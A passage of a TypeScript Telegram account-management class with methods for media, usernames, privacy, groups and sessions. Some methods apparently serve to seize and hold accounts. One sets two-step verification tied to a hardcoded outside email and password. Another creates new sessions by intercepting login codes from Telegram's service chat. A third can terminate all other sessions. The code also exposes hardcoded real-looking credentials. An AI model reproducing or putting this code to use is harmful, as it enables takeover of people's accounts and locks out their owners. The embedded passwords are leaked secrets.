                validateStatus: (status) => status >= 200 && status < 300
            });

            const buffer = Buffer.from(response.data);
            if (buffer.length > maxSize) {
                throw new Error(`Downloaded file size ${buffer.length} exceeds maximum ${maxSize} bytes`);
            }

            return buffer;
        } catch (error) {
            if (error.response) {
                throw new Error(`Failed to download file: HTTP ${error.response.status} - ${error.response.statusText}`);
            } else if (error.code === 'ECONNABORTED') {
                throw new Error(`Failed to download file: Request timeout after ${this.FILE_DOWNLOAD_TIMEOUT}ms`);
            } else {
                throw new Error(`Failed to download file: ${error.message}`);
            }
        }
    }

    /**
     * Detect content type from filename and optional mime type
     * @param filename - File name with extension
     * @param mimeType - Optional MIME type from source
     * @returns MIME type string
     */
    private detectContentType(filename: string, mimeType?: string): string {
        if (mimeType) return mimeType;

        const ext = filename.split('.').pop()?.toLowerCase() || '';
        const mimeMap: Record<string, string> = {
            'jpg': 'image/jpeg',
            'jpeg': 'image/jpeg',
            'png': 'image/png',
            'gif': 'image/gif',
            'webp': 'image/webp',
            'mp4': 'video/mp4',
            'webm': 'video/webm',
            'mov': 'video/quicktime',
            'avi': 'video/x-msvideo',
            'ogg': 'audio/ogg',
            'mp3': 'audio/mpeg',
            'wav': 'audio/wav',
            'pdf': 'application/pdf',
            'zip': 'application/zip',
            'doc': 'application/msword',
            'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        };

        return mimeMap[ext] || 'application/octet-stream';
    }

    /**
     * Generate ETag for media caching
     * @param messageId - Message ID
     * @param chatId - Chat ID
     * @param fileId - File ID
     * @returns ETag string
     */
    private generateETag(messageId: number, chatId: string, fileId: bigInt.BigInteger | string | number): string {
        const fileIdStr = typeof fileId === 'object' ? fileId.toString() : String(fileId);
        return `"${messageId}-${chatId}-${fileIdStr}"`;
    }

    async forwardMessage(toChatId: string, fromChatId: string, messageId: number) {
        try {
            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId })
        } catch (error) {
            this.logger.info(this.phoneNumber, "Failed to Forward Message : ", error.errorMessage);
        }
    }

    async updateUsername(baseUsername) {
        let newUserName = ''
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;

        if (username === '') {
            try {
                await this.client.invoke(new Api.account.UpdateUsername({ username }));
                this.logger.info(this.phoneNumber, `Removed Username successfully.`);
            } catch (error) {
                this.logger.info(this.phoneNumber, error)
            }
        } else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(
                        new Api.account.CheckUsername({ username })
                    );
                    this.logger.info(this.phoneNumber, `Avialable: ${result} (${username})`)
                    if (result) {
                        await this.client.invoke(new Api.account.UpdateUsername({ username }));
                        this.logger.info(this.phoneNumber, `Username '${username}' updated successfully.`);
                        newUserName = username
                        break;
                    } else {
                        // Use only 2 numbers, no alphabets, for last 4 attempts (6, 7, 8, 9)
                        if (increment >= 6) {
                            const randomNums = Math.floor(Math.random() * 90 + 10); // 2 digit number
                            username = baseUsername + randomNums;
                        } else {
                            username = baseUsername + increment;
                        }
                        increment++;
                        await sleep(2000);
                    }
                } catch (error) {
                    this.logger.info(this.phoneNumber, error.message)
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    // Use random characters for last 4 attempts (6, 7, 8, 9)
                    if (increment >= 6) {
                        const randomChars = Math.random().toString(36).substring(2, 6);
                        username = baseUsername + randomChars;
                    } else {
                        username = baseUsername + increment;
                    }
                    increment++;
                    await sleep(2000);
                }
            }
        }
        return newUserName;
    }

    async updatePrivacy() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            this.logger.info(this.phoneNumber, "Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            this.logger.info(this.phoneNumber, "PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyForwards(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            this.logger.info(this.phoneNumber, "forwards Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            this.logger.info(this.phoneNumber, "Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll(),
                    ],
                })
            );
            this.logger.info(this.phoneNumber, "LAstSeen Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
        }
        catch (e) {
            throw e
        }
    }

    async sendViewOnceMedia(chatId: string, buffer: Buffer, caption = '', isVideo?: boolean, filename?: string): Promise<Api.TypeUpdates> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;
            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';
            const inputFile = await this.client.uploadFile({
                file: new CustomFile(actualFilename, buffer.length, actualFilename, buffer),
                workers: 1
            });
            const result = await this.client.invoke(new Api.messages.SendMedia({
                peer: chatId,
                media: isVideo
                    ? new Api.InputMediaUploadedDocument({
                        file: inputFile,
                        mimeType,
                        attributes: [
                            new Api.DocumentAttributeVideo({
                                supportsStreaming: true,
                                duration: 0,
                                w: 0,
                                h: 0
                            })
                        ],
                        ttlSeconds: 10
                    })
                    : new Api.InputMediaUploadedPhoto({
                        file: inputFile,
                        ttlSeconds: 10
                    }),
                message: caption,
                randomId: bigInt(Math.floor(Math.random() * 1000000000))
            }));

            this.logger.info(this.phoneNumber, `Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
            return result;
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending view-once media:', error);
            throw error;
        }
    }


    async getFileUrl(url: string, filename: string): Promise<string> {
        // Generate unique filename to avoid conflicts
        const uniqueFilename = `${filename}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
        const filePath = `/tmp/${uniqueFilename}`;

        try {
            const response = await axios.get(url, {
                responseType: 'stream',
                timeout: this.FILE_DOWNLOAD_TIMEOUT,
                maxContentLength: this.MAX_FILE_SIZE,
                validateStatus: (status) => status >= 200 && status < 300
            });

            await new Promise<void>((resolve, reject) => {
                const writer = fs.createWriteStream(filePath);
                writer.on('finish', () => resolve());
                writer.on('error', reject);
                response.data.pipe(writer);
                response.data.on('error', reject);
            });

            // Schedule cleanup after 1 hour
            setTimeout(() => {
                try {
                    if (fs.existsSync(filePath)) {
                        fs.unlinkSync(filePath);
                        this.logger.debug(this.phoneNumber, `Cleaned up temp file: ${filePath}`);
                    }
                } catch (cleanupError) {
                    this.logger.warn(this.phoneNumber, `Failed to cleanup temp file ${filePath}:`, cleanupError);
                }
            }, this.TEMP_FILE_CLEANUP_DELAY);

            return filePath;
        } catch (error) {
            // Cleanup on error
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                }
            } catch (cleanupError) {
                // Ignore cleanup errors
            }

            if (error.response) {
                throw new Error(`Failed to download file: HTTP ${error.response.status}`);
            } else if (error.code === 'ECONNABORTED') {
                throw new Error(`Failed to download file: Request timeout`);
            } else {
                throw new Error(`Failed to download file: ${error.message}`);
            }
        }
    }

    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new CustomFile(
                    'pic.jpg',
                    fs.statSync(
                        image
                    ).size,
                    image
                ),
                workers: 1,
            });
            this.logger.info(this.phoneNumber, "file uploaded")
            await this.client.invoke(new Api.photos.UploadProfilePhoto({
                file: file,
            }));
            this.logger.info(this.phoneNumber, "profile pic updated")
        } catch (error) {
            throw error
        }
    }

    async hasPassword(): Promise<boolean> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
            return passwordInfo.hasPassword || false;
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error checking password status:', error);
            // Return false as safe default if check fails
            return false;
        }
    }

    async set2fa() {
        if (!(await this.hasPassword())) {
            this.logger.info(this.phoneNumber, "Password Does not exist, Setting 2FA");

            const imapService = MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };

            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    this.logger.info(this.phoneNumber, "Checking if mail is ready");

                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        this.logger.info(this.phoneNumber, "Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                this.logger.info(this.phoneNumber, "Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            this.logger.info(this.phoneNumber, "Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                this.logger.info(this.phoneNumber, 'Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            } else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        } catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                this.logger.error(this.phoneNumber, 'Email code error:', parseError(e));
                                return Promise.resolve("error");
                            }
                        });

                        return twoFaDetails;
                    } else {
                        this.logger.info(this.phoneNumber, "Mail not ready yet");
                    }
                }, 5000);
            } catch (e) {
                this.logger.error(this.phoneNumber, "Unable to connect to mail server:", parseError(e));
            }
        } else {
            this.logger.info(this.phoneNumber, "Password already exists");
        }
    }


    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            // Download directly to buffer without saving to disk
            const buffer = await this.downloadFileFromUrl(url);
            const file = new CustomFile(filename, buffer.length, filename, buffer);
            await this.client.sendFile(id, { file, caption });
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending photo:', error);
            throw error;
        }
    }

    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            // Download directly to buffer without saving to disk
            const buffer = await this.downloadFileFromUrl(url);
            const file = new CustomFile(filename, buffer.length, filename, buffer);
            await this.client.sendFile(id, { file, caption });
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending file:', error);
            throw error;
        }
    }

    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );
            this.logger.info(this.phoneNumber, `Profile Pics found: ${result.photos.length}`)
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(
                    new Api.photos.DeletePhotos({
                        id: <Api.TypeInputPhoto[]><unknown>result.photos
                    }))
            }
            this.logger.info(this.phoneNumber, "Deleted profile Photos");
        } catch (error) {
            throw error
        }
    }

    async createNewSession(): Promise<string> {
        const timeoutPromise = new Promise<string>((_, reject) =>
            setTimeout(() => reject(new Error('Session creation timed out after 1 minute')), 1 * 60 * 1000)
        );

        const sessionPromise = (async () => {
            const me = <Api.User>await this.client.getMe();
            this.logger.info(this.phoneNumber, "Creating new session for: ", me.phone);

            const newClient = new TelegramClient(
                new StringSession(''),
                parseInt(process.env.API_ID),
                process.env.API_HASH,
                await generateTGConfig(this.phoneNumber)
            );

            this.logger.info(this.phoneNumber, "Starting Session Creation...");
            await newClient.start({
                phoneNumber: me.phone,
                password: async () => "Ajtdmwajt1@",
                phoneCode: async () => {
                    this.logger.info(this.phoneNumber, 'Waiting for the OTP code from chat ID 777000...');
                    return await this.waitForOtp();
                },
                onError: (err: any) => { throw err },
            });

            this.logger.info(this.phoneNumber, "Session Creation Completed");
            const session = <string><unknown>newClient.session.save();

            await newClient.destroy();
            this.logger.info(this.phoneNumber, "New Session: ", session);

            return session;
        })();

        return Promise.race([sessionPromise, timeoutPromise]);
    }


    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                this.logger.info(this.phoneNumber, "Attempt : ", i)
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    this.logger.info(this.phoneNumber, "returning: ", code);
                    return code;
                } else {
                    this.logger.info(this.phoneNumber, `Message Date: ${new Date(message.date * 1000).toISOString()} Now: ${new Date(Date.now() - 60000).toISOString()}`);
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    this.logger.info(this.phoneNumber, "Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await sleep(5000)
                }
            } catch (err) {
                await sleep(2000)
                this.logger.info(this.phoneNumber, err)
            }
        }
    }

    async createGroupWithOptions(options: GroupOptions): Promise<Api.Chat | Api.Channel> {
        if (!this.client) throw new Error('Client not initialized');
        const result = await this.createGroupOrChannel(options);

        // Find the channel in updates safely
        let channelId: bigInt.BigInteger | undefined;
        if ('updates' in result) {
            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
            const channelUpdate = updates.find(u => u instanceof Api.UpdateChannel);
            if (channelUpdate && 'channelId' in channelUpdate) {
                channelId = channelUpdate.channelId;
            }
        }

        if (!channelId) {
            throw new Error('Failed to create channel');
        }

        const channel = await this.client.getEntity(channelId);
        if (!(channel instanceof Api.Channel)) {
            throw new Error('Created entity is not a channel');
        }

        if (options.members?.length) {
            const users = await Promise.all(
                options.members.map(member => this.client.getInputEntity(member))
            );

            await this.client.invoke(new Api.channels.InviteToChannel({
                channel: await this.client.getInputEntity(channel),
                users
            }));
        }

        if (options.photo) {
            const buffer = await this.downloadFileFromUrl(options.photo);
            const inputFile = await this.client.uploadFile({
                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });

            await this.client.invoke(new Api.channels.EditPhoto({
                channel: await this.client.getInputEntity(channel),
                photo: new Api.InputChatUploadedPhoto({
                    file: inputFile
                })
            }));
        }

        return channel;
    }

    async updateGroupSettings(settings: {
        groupId: string;
        title?: string;
        description?: string;
        slowMode?: number;
        memberRestrictions?: any;
        username?: string;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getEntity(settings.groupId);

        if (settings.title) {
            await this.client.invoke(new Api.channels.EditTitle({
                channel: channel,
                title: settings.title || ''
            }))
        };

        if (settings.description) {
            await this.client.invoke(new Api.messages.EditChatAbout({
                peer: channel,
                about: settings.description
            }));
        }

        if (settings.username) {
            await this.client.invoke(new Api.channels.UpdateUsername({
                channel: channel,
                username: settings.username
            }));
        }


        if (settings.slowMode !== undefined) {
            await this.client.invoke(new Api.channels.ToggleSlowMode({
                channel: channel,
                seconds: settings.slowMode
            }));
        }

        return true;
    }

    async scheduleMessageSend(opts: MessageScheduleOptions) {
        if (!this.client) throw new Error('Client not initialized');

        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);

        if (opts.media) {
            const buffer = await this.downloadFileFromUrl(opts.media.url);

            const uploadedFile = await this.client.uploadFile({
                file: new CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });

            return this.client.sendFile(opts.chatId, {
                file: uploadedFile,
                caption: opts.message,
                forceDocument: opts.media.type === 'document',
                scheduleDate
            });
        }

        return this.client.sendMessage(opts.chatId, {
            message: opts.message,
            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)
        });
    }

    async getScheduledMessages(chatId: string): Promise<Api.TypeMessage[]> {
        if (!this.client) throw new Error('Client not initialized');

        const result = await this.client.invoke(new Api.messages.GetScheduledHistory({
            peer: chatId,
            hash: bigInt(0)
        }));

        return 'messages' in result && Array.isArray(result.messages)
            ? result.messages.filter(msg => msg instanceof Api.Message)
            : [];
    }

    async sendMediaAlbum(album: MediaAlbumOptions) {
        if (!this.client) throw new Error('Client not initialized');

        const results: Api.InputSingleMedia[] = [];
        const errors: Array<{ index: number; error: string }> = [];

        // Process items individually to handle partial failures
        for (let i = 0; i < album.media.length; i++) {
            const item = album.media[i];
            try {
                const buffer = await this.downloadFileFromUrl(item.url);
                const uploadedFile = await this.client.uploadFile({
                    file: new CustomFile(
                        item.filename || `media_${i}`,
                        buffer.length,
                        item.filename || `media_${i}`,
                        buffer
                    ),
                    workers: 1
                });

                const media = new Api.InputSingleMedia({
                    media: item.type === 'photo'
                        ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })
                        : new Api.InputMediaUploadedDocument({
                            file: uploadedFile,
                            mimeType: item.type === 'video' ? 'video/mp4' : this.detectContentType(item.filename || `media_${i}`),
                            attributes: item.type === 'video' ? [
                                new Api.DocumentAttributeVideo({
                                    supportsStreaming: true,
                                    duration: 0,
                                    w: 0,
                                    h: 0
                                })
                            ] : []
                        }),
                    message: item.caption || '',
                    entities: []
                });

                results.push(media);
            } catch (error) {
                this.logger.error(this.phoneNumber, `Error processing album item ${i}:`, error);
                errors.push({
                    index: i,
                    error: error.message || 'Unknown error'
                });
            }
        }

        if (results.length === 0) {
            throw new Error('No media items could be processed. All items failed.');
        }

        const sendResult = await this.client.invoke(new Api.messages.SendMultiMedia({
            peer: album.chatId,
            multiMedia: results
        }));

        return {
            ...sendResult,
            success: results.length,
            failed: errors.length,
            errors: errors.length > 0 ? errors : undefined
        };
    }

    async sendMessage(params: SendTgMessageDto) {
        if (!this.client) throw new Error('Client not initialized');
        const { peer, parseMode, message } = params;
        return await this.client.sendMessage(peer, { message, parseMode });
    }

    async sendVoiceMessage(voice: {
        chatId: string;
        url: string;
        duration?: number;
        caption?: string;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        try {
            const buffer = await this.downloadFileFromUrl(voice.url);

            return await this.client.invoke(new Api.messages.SendMedia({
                peer: voice.chatId,
                media: new Api.InputMediaUploadedDocument({
                    file: await this.client.uploadFile({
                        file: new CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),
                        workers: 1
                    }),
                    mimeType: 'audio/ogg',
                    attributes: [
                        new Api.DocumentAttributeAudio({
                            voice: true,
                            duration: voice.duration || 0
                        })
                    ]
                }),
                message: voice.caption || '',
                randomId: bigInt(Math.floor(Math.random() * 1000000000))
            }));
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending voice message:', error);
            throw error;
        }
    }

    async cleanupChat(cleanup: {
        chatId: string;
        beforeDate?: Date;
        onlyMedia?: boolean;
        excludePinned?: boolean;
        revoke?: boolean;
    }) {
        if (!this.client) throw new Error('Client not initialized');
        cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;

        const messages = await this.client.getMessages(cleanup.chatId, {
            limit: 1000,
            ...(cleanup.beforeDate && {
                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)
            })
        });

        const toDelete = messages.filter(msg => {
            if (cleanup.excludePinned && msg.pinned) return false;
            if (cleanup.onlyMedia && !msg.media) return false;
            return true;
        });

        if (toDelete.length > 0) {
            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {
                revoke: cleanup.revoke
            })
        }

        return { deletedCount: toDelete.length };
    }

    async updatePrivacyBatch(settings: {
        phoneNumber?: 'everybody' | 'contacts' | 'nobody';
        lastSeen?: 'everybody' | 'contacts' | 'nobody';
        profilePhotos?: 'everybody' | 'contacts' | 'nobody';
        forwards?: 'everybody' | 'contacts' | 'nobody';
        calls?: 'everybody' | 'contacts' | 'nobody';
        groups?: 'everybody' | 'contacts' | 'nobody';
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const privacyRules = {
            everybody: [new Api.InputPrivacyValueAllowAll()],
            contacts: [new Api.InputPrivacyValueAllowContacts()],
            nobody: [new Api.InputPrivacyValueDisallowAll()]
        };

        const updates = [];

        const privacyMap = {
            phoneNumber: Api.InputPrivacyKeyPhoneNumber,
            lastSeen: Api.InputPrivacyKeyStatusTimestamp,
            profilePhotos: Api.InputPrivacyKeyProfilePhoto,
            forwards: Api.InputPrivacyKeyForwards,
            calls: Api.InputPrivacyKeyPhoneCall,
            groups: Api.InputPrivacyKeyChatInvite
        };

        for (const [key, value] of Object.entries(settings)) {
            if (value && key in privacyMap) {
                updates.push(this.client.invoke(new Api.account.SetPrivacy({
                    key: new privacyMap[key](),
                    rules: privacyRules[value]
                })));
            }
        }

        await Promise.all(updates);
        return true;
    }

    async getSessionInfo() {
        if (!this.client) throw new Error('Client not initialized');

        const [authorizationsResult, devicesResult] = await Promise.all([
            this.client.invoke(new Api.account.GetAuthorizations()),
            this.client.invoke(new Api.account.GetWebAuthorizations())
        ]);

        const sessions = authorizationsResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            deviceModel: auth.deviceModel,
            platform: auth.platform,
            systemVersion: auth.systemVersion,
            appName: auth.appName,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            country: auth.country,
            region: auth.region
        }));

        const webSessions = devicesResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            domain: auth.domain,
            browser: auth.browser,
            platform: auth.platform,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            region: auth.region
        }));

        return {
            sessions,
            webSessions
        };
    }

    async terminateSession(options: {
        hash: string;
        type: 'app' | 'web';
        exceptCurrent?: boolean;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        if (options.exceptCurrent) {
            if (options.type === 'app') {
                await this.client.invoke(new Api.auth.ResetAuthorizations());
            } else {
                await this.client.invoke(new Api.account.ResetWebAuthorizations());
            }
            return true;
        }

        if (options.type === 'app') {
            await this.client.invoke(new Api.account.ResetAuthorization({
                hash: bigInt(options.hash)
            }));
        } else {
            await this.client.invoke(new Api.account.ResetWebAuthorization({
                hash: bigInt(options.hash)
            }));
        }
        return true;
    }

    async getChatStatistics(chatId: string, period: 'day' | 'week' | 'month') {
        if (!this.client) throw new Error('Client not initialized');

        const now = Math.floor(Date.now() / 1000);
        const periodInSeconds = {
            day: 24 * 60 * 60,
            week: 7 * 24 * 60 * 60,
            month: 30 * 24 * 60 * 60
        }[period];

        const messages = await this.client.getMessages(chatId, {
            limit: 100,
            offsetDate: now - periodInSeconds
        });

        const stats = {
            period,
            totalMessages: messages.length,
            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,
            messageTypes: {
                text: messages.filter(m => !m.media && m.message).length,
                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,
                video: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');
                }).length,
                voice: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');
                }).length,
                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length
            },
            topSenders: Object.entries(
                messages.reduce((acc, msg) => {
                    const senderId = msg.fromId?.toString();
                    if (senderId) {
                        acc[senderId] = (acc[senderId] || 0) + 1;
                    }
                    return acc;
                }, {} as Record<string, number>)
            )
                .sort(([, a], [, b]) => b - a)
                .slice(0, 10)
                .map(([id, count]) => ({ id, count })),
            mostActiveHours: Object.entries(
                messages.reduce((acc, msg) => {
                    const hour = new Date(msg.date * 1000).getHours();
                    acc[hour] = (acc[hour] || 0) + 1;
                    return acc;
                }, {} as Record<number, number>)
            )
                .sort(([, a], [, b]) => b - a)
                .map(([hour, count]) => ({ hour: Number(hour), count }))
        };

        return stats;
    }

    private getMediaExtension(media: any): string {
        if (!media) return 'bin';

        switch (media.className) {
            case 'MessageMediaPhoto':
                return 'jpg';
            case 'MessageMediaDocument':
                const doc = media.document;
                if (!doc || !('mimeType' in doc)) return 'bin';

                const mime = doc.mimeType;
                if (mime?.startsWith('video/')) return 'mp4';
                if (mime?.startsWith('image/')) return mime.split('/')[1];
                if (mime?.startsWith('audio/')) return 'ogg';
                return 'bin';
            default:
                return 'bin';
        }
    }

    private getSearchFilter(filter: string): Api.TypeMessagesFilter {
        switch (filter) {
            case 'photo': return new Api.InputMessagesFilterPhotos();
            case 'video': return new Api.InputMessagesFilterVideo();
            case 'document': return new Api.InputMessagesFilterDocument();
            case 'url': return new Api.InputMessagesFilterUrl();
            case 'roundVideo': return new Api.InputMessagesFilterRoundVideo();
            case 'phtotoVideo': return new Api.InputMessagesFilterPhotoVideo();
            case 'voice': return new Api.InputMessagesFilterVoice();
            case 'roundVoice': return new Api.InputMessagesFilterRoundVoice();
            case 'gif': return new Api.InputMessagesFilterGif();
            case 'sticker': return new Api.InputMessagesFilterDocument();
            case 'animation': return new Api.InputMessagesFilterDocument();
            case 'music': return new Api.InputMessagesFilterMusic();
            case 'chatPhoto': return new Api.InputMessagesFilterChatPhotos();
            case 'location': return new Api.InputMessagesFilterGeo();
            case 'contact': return new Api.InputMessagesFilterContacts();
            case 'chatPhoto': return new Api.InputMessagesFilterChatPhotos();
            case 'phoneCalls': return new Api.InputMessagesFilterPhoneCalls({ missed: false });
            default: return new Api.InputMessagesFilterEmpty();
        }
    }

    private getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' {
        if (media instanceof Api.MessageMediaPhoto) {
            return 'photo';
        } else if (media instanceof Api.MessageMediaDocument) {
            const document = media.document as Api.Document;
            if (document.attributes.some(attr => attr instanceof Api.DocumentAttributeVideo)) {
                return 'video';
            }
            return 'document';
        }
        return 'document';
    }

    private getEntityId(entity: Api.TypeInputPeer | Api.TypeUser | Api.TypeChat): string {
        if (entity instanceof Api.User) return entity.id.toString();
        if (entity instanceof Api.Channel) return entity.id.toString();
        if (entity instanceof Api.Chat) return entity.id.toString();
        return '';
    }

    async addGroupMembers(groupId: string, members: string[]): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        const users = await Promise.all(
            members.map(member => this.client.getInputEntity(member))
        );

        await this.client.invoke(new Api.channels.InviteToChannel({
            channel: channel,
            users
        }));
    }

    async removeGroupMembers(groupId: string, members: string[]): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        for (const member of members) {
            const user = await this.client.getInputEntity(member);
            await this.client.invoke(new Api.channels.EditBanned({
                channel: channel,
                participant: user,
                bannedRights: new Api.ChatBannedRights({
                    untilDate: 0,
                    viewMessages: true,
                    sendMessages: true,
                    sendMedia: true,
                    sendStickers: true,
                    sendGifs: true,
                    sendGames: true,
                    sendInline: true,
                    embedLinks: true
                })
            }));
        }
    }

    async promoteToAdmin(
        groupId: string,
        userId: string,
        permissions?: {
            changeInfo?: boolean;
            postMessages?: boolean;
            editMessages?: boolean;
            deleteMessages?: boolean;
            banUsers?: boolean;
            inviteUsers?: boolean;
            pinMessages?: boolean;
            addAdmins?: boolean;
            anonymous?: boolean;
            manageCall?: boolean;
        },
        rank?: string
    ): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);

        await this.client.invoke(new Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new Api.ChatAdminRights({
                changeInfo: permissions?.changeInfo ?? false,
                postMessages: permissions?.postMessages ?? false,
                editMessages: permissions?.editMessages ?? false,
                deleteMessages: permissions?.deleteMessages ?? false,
                banUsers: permissions?.banUsers ?? false,
                inviteUsers: permissions?.inviteUsers ?? true,
                pinMessages: permissions?.pinMessages ?? false,
                addAdmins: permissions?.addAdmins ?? false,
                anonymous: permissions?.anonymous ?? false,
                manageCall: permissions?.manageCall ?? false,
                other: false
            }),
            rank: rank || ''
        }));
    }

    async demoteAdmin(groupId: string, userId: string): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);

        await this.client.invoke(new Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new Api.ChatAdminRights({
                changeInfo: false,
                postMessages: false,
                editMessages: false,
                deleteMessages: false,
                banUsers: false,
                inviteUsers: false,
                pinMessages: false,
                addAdmins: false,
                anonymous: false,
                manageCall: false,
                other: false
            }),
            rank: ''
        }));
    }

    async unblockGroupUser(groupId: string, userId: string): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);

        await this.client.invoke(new Api.channels.EditBanned({
            channel: channel,
            participant: user,
            bannedRights: new Api.ChatBannedRights({
                untilDate: 0,
                viewMessages: false,
                sendMessages: false,
                sendMedia: false,
                sendStickers: false,
                sendGifs: false,
                sendGames: false,
                sendInline: false,
                embedLinks: false
            })
        }));
    }

    async getGroupAdmins(groupId: string): Promise<Array<{
        userId: string;
        rank?: string;
        permissions: {
            changeInfo: boolean;
            postMessages: boolean;
            editMessages: boolean;
            deleteMessages: boolean;
            banUsers: boolean;
            inviteUsers: boolean;
            pinMessages: boolean;
            addAdmins: boolean;
            anonymous: boolean;
